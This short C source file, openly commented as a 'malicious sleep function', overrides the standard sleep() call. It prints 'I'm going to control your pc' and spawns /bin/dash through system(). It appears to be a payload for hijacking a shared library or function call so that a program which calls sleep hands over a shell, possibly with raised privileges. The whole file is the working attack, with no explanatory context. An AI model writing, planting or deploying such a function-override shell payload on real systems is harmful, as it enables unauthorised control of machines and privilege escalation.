#include <stdio.h>
#include <stdlib.h>
// malicious sleep function

void sleep(int s)
{
  printf("I'm going to control your pc\n");
  system("/bin/dash");
}